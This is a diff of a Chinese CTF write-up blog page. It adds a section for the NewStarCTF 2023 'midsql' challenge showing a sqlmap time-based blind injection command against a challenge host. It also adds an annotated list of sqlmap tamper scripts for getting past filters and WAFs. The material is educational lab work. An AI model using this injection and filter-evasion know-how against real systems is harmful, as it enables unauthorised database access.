@@ -367,6 +367,7 @@
     <li><a href="#midsql">midsql</a>
       <ol>
         <li><a href="#时间盲注">时间盲注！</a></li>
+        <li><a href="#sqlmap跑">sqlmap跑！</a></li>
       </ol>
     </li>
     <li><a href="#otenkiboy">OtenkiBoy</a>
@@ -479,7 +480,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 43 分钟
+                    阅读时长: 45 分钟
                 </time>
             </div>
         
@@ -3484,7 +3485,117 @@
 <img src="image-20250515002508738.png" alt="image-20250515002508738" style="zoom:50%;" />
 <p>[<a class="link" href="https://blog.csdn.net/m0_63138919/article/details/133999468"  target="_blank" rel="noopener"
     >wp]NewStarCTF 2023 WEEK4|WEB_newstarctf2023 week4-CSDN博客</a></p>
-<p>sqlmap没跑出来，遗憾，不知道哪里的问题</p>
+<h3 id="sqlmap跑">sqlmap跑！
+</h3><p>知道过滤了空格，=换成了like，所以加上&ndash;tamper=space2comment &ndash;tamper=equaltolike（要是不知道挺麻烦的）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://bf21b640-3edd-4980-96dd-bb51220d8613.node5.buuoj.cn:81/?id=1&#34; -p id
+</span></span><span class="line"><span class="cl"> --random-agent --fresh-queries --no-cast  --tamper=space2comment --tamper=equaltolike --technique=T -dbs  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跑出来了！（之后不过多演示）</p>
+<p><img src="/p/2023-newstar-web/image-20250527233643342.png"
+	width="1391"
+	height="473"
+	srcset="/p/2023-newstar-web/image-20250527233643342_hu_327b3c17ca2fe9a8.png 480w, /p/2023-newstar-web/image-20250527233643342_hu_b1073a5e82d6a2f6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527233643342"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="705px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#tamper用法</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">tamper</span><span class="o">=</span><span class="n">base64encode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">tamper</span><span class="o">=</span><span class="n">test</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2comment</span><span class="o">.</span><span class="n">py</span>                 <span class="n">用</span><span class="o">/**/</span><span class="n">代替空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">apostrophemask</span><span class="o">.</span><span class="n">py</span>                 <span class="n">用utf8代替引号</span>
+</span></span><span class="line"><span class="cl"><span class="n">equaltolike</span><span class="o">.</span><span class="n">py</span>                     <span class="n">like代替等号</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2dash</span><span class="o">.</span><span class="n">py</span>                   <span class="n">绕过过滤</span><span class="err">‘</span><span class="o">=</span><span class="err">’</span> <span class="n">替换空格字符</span><span class="err">（”），（’–‘）</span><span class="n">后跟一个破折号注释</span><span class="err">，</span><span class="n">一个随机字符串和一个新行</span><span class="err">（’</span><span class="n">n</span><span class="err">’）</span>
+</span></span><span class="line"><span class="cl"><span class="n">greatest</span><span class="o">.</span><span class="n">py</span>                     <span class="n">绕过过滤</span><span class="err">’</span><span class="o">&gt;</span><span class="err">’</span> <span class="p">,</span><span class="n">用GREATEST替换大于号</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2hash</span><span class="o">.</span><span class="n">py</span>                     <span class="n">空格替换为</span><span class="c1">#号,随机字符串以及换行符</span>
+</span></span><span class="line"><span class="cl"><span class="n">apostrophenullencode</span><span class="o">.</span><span class="n">py</span>         <span class="n">绕过过滤双引号</span><span class="err">，</span><span class="n">替换字符和双引号</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">halfversionedmorekeywords</span><span class="o">.</span><span class="n">py</span>    <span class="n">当数据库为mysql时绕过防火墙</span><span class="err">，</span><span class="n">每个关键字之前添加mysql版本评论</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2morehash</span><span class="o">.</span><span class="n">py</span>                 <span class="n">空格替换为</span> <span class="c1">#号 以及更多随机字符串 换行符</span>
+</span></span><span class="line"><span class="cl"><span class="n">appendnullbyte</span><span class="o">.</span><span class="n">py</span>                 <span class="n">在有效负荷结束位置加载零字节字符编码</span>
+</span></span><span class="line"><span class="cl"><span class="n">ifnull2ifisnull</span><span class="o">.</span><span class="n">py</span>                 <span class="n">绕过对IFNULL过滤</span><span class="p">,</span><span class="n">替换类似</span><span class="s1">&#39;IFNULL(A,B)&#39;</span><span class="n">为</span><span class="s1">&#39;IF(ISNULL(A), B, A)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2mssqlblank</span><span class="o">.</span><span class="n">py</span>             <span class="p">(</span><span class="n">mssql</span><span class="p">)</span><span class="n">空格替换为其它空符号</span>
+</span></span><span class="line"><span class="cl"><span class="n">base64encode</span><span class="o">.</span><span class="n">py</span>                 <span class="n">用base64编码替换</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2mssqlhash</span><span class="o">.</span><span class="n">py</span>                 <span class="n">替换空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">modsecurityversioned</span><span class="o">.</span><span class="n">py</span>         <span class="n">过滤空格</span><span class="err">，</span><span class="n">包含完整的查询版本注释</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2mysqlblank</span><span class="o">.</span><span class="n">py</span>             <span class="n">空格替换其它空白符号</span><span class="p">(</span><span class="n">mysql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">between</span><span class="o">.</span><span class="n">py</span>                        <span class="n">用between替换大于号</span><span class="err">（</span><span class="o">&gt;</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2mysqldash</span><span class="o">.</span><span class="n">py</span>                <span class="n">替换空格字符</span><span class="err">（”）（’</span> <span class="err">–</span> <span class="err">‘）</span><span class="n">后跟一个破折号注释一个新行</span><span class="err">（’</span> <span class="n">n</span><span class="err">’）</span>
+</span></span><span class="line"><span class="cl"><span class="n">multiplespaces</span><span class="o">.</span><span class="n">py</span>                <span class="n">围绕SQL关键字添加多个空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2plus</span><span class="o">.</span><span class="n">py</span>                     <span class="n">用</span><span class="o">+</span><span class="n">替换空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">bluecoat</span><span class="o">.</span><span class="n">py</span>                     <span class="n">代替空格字符后与一个有效的随机空白字符的SQL语句</span><span class="p">,</span><span class="n">然后替换</span><span class="o">=</span><span class="n">为like</span>
+</span></span><span class="line"><span class="cl"><span class="n">nonrecursivereplacement</span><span class="o">.</span><span class="n">py</span>      <span class="n">双重查询语句</span><span class="p">,</span><span class="n">取代SQL关键字</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2randomblank</span><span class="o">.</span><span class="n">py</span>            <span class="n">代替空格字符</span><span class="err">（“”）</span><span class="n">从一个随机的空白字符可选字符的有效集</span>
+</span></span><span class="line"><span class="cl"><span class="n">sp_password</span><span class="o">.</span><span class="n">py</span>                    <span class="n">追加sp_password</span><span class="err">’</span><span class="n">从DBMS日志的自动模糊处理的有效载荷的末尾</span>
+</span></span><span class="line"><span class="cl"><span class="n">chardoubleencode</span><span class="o">.</span><span class="n">py</span>                <span class="n">双url编码</span><span class="p">(</span><span class="n">不处理以编码的</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">unionalltounion</span><span class="o">.</span><span class="n">py</span>                <span class="n">替换UNION</span> <span class="n">ALLSELECT</span> <span class="n">UNION</span> <span class="n">SELECT</span>
+</span></span><span class="line"><span class="cl"><span class="n">charencode</span><span class="o">.</span><span class="n">py</span>                     <span class="n">url编码</span>
+</span></span><span class="line"><span class="cl"><span class="n">randomcase</span><span class="o">.</span><span class="n">py</span>                    <span class="n">随机大小写</span>
+</span></span><span class="line"><span class="cl"><span class="n">unmagicquotes</span><span class="o">.</span><span class="n">py</span>                <span class="n">宽字符绕过</span> <span class="n">GPCaddslashes</span>
+</span></span><span class="line"><span class="cl"><span class="n">randomcomments</span><span class="o">.</span><span class="n">py</span>                <span class="n">用</span><span class="o">/**/</span><span class="n">分割sql关键字</span>
+</span></span><span class="line"><span class="cl"><span class="n">charunicodeencode</span><span class="o">.</span><span class="n">py</span>            <span class="n">字符串</span> <span class="n">unicode</span> <span class="n">编码</span>
+</span></span><span class="line"><span class="cl"><span class="n">securesphere</span><span class="o">.</span><span class="n">py</span>                    <span class="n">追加特制的字符串</span>
+</span></span><span class="line"><span class="cl"><span class="n">versionedmorekeywords</span><span class="o">.</span><span class="n">py</span>        <span class="n">注释绕过</span>
+</span></span><span class="line"><span class="cl"><span class="n">space2comment</span><span class="o">.</span><span class="n">py</span>                <span class="n">替换空格字符串</span><span class="p">(</span><span class="err">‘‘</span><span class="p">)</span> <span class="n">使用注释</span><span class="err">‘</span><span class="o">/**/</span><span class="err">’</span>
+</span></span><span class="line"><span class="cl"><span class="n">halfversionedmorekeywords</span><span class="o">.</span><span class="n">py</span>    <span class="n">关键字前加注释</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.freebuf.com/sectool/179035.html"  target="_blank" rel="noopener"
+    >SqlMap 1.2.7.20 Tamper详解及使用指南 - FreeBuf网络安全行业门户</a></p>
 <p>至此，大多sql注入已经考了，对联合注入，布尔盲注，时间盲注越加熟悉了一点，学到了！</p>
 <h2 id="otenkiboy">OtenkiBoy
 </h2><p>此题是week3的升级版，漏洞依旧是在info.js里</p>
@@ -5374,6 +5485,7 @@
 		data-flex-basis="531px"
 	
 ></p>
+<p>这套题写了很久，收获很大，继续努力吧，未来可期</p>
 
 </section>
 
